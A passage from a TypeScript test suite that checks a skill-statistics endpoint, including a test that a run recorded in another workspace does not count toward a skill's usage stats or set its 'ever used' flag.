      expect(s.accept_rate).toBeNull();
      expect(s.findings_30d).toBe(0);
      expect(s.findings_by_category).toEqual({});
      await app.close();
    });

    // a run of another workspace recording this skill is neither a use nor "ever used" here
    it("AC-47: another workspace's run of the skill neither counts nor sets ever_used", async () => {
      const db = pg.handle.db;
      const { app, skill } = await seedRuns();
      const [otherWs] = await db.insert(t.workspaces).values({ name: `ever-other-${Date.now()}` }).returning();
      const [otherAgent] = await db
        .insert(t.agents)
        .values({ workspaceId: otherWs!.id, name: 'Foreign Agent', provider: 'openrouter', model: 'x/y', systemPrompt: 'p' })
        .returning();
      const [r] = await db
        .insert(t.agentRuns)
        .values({ workspaceId: otherWs!.id, agentId: otherAgent!.id, status: 'done', source: 'local', model: 'm', ranAt: new Date(Date.now() - HOUR) })
        .returning();
      await db.insert(t.runSkills).values({ runId: r!.id, skillId: skill.id, order: 0 });
      const s = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery()}` })).json();
      expect(s).toMatchObject({ runs_with_skill: 0, ever_used: false });
      await app.close();
    });
  });
});
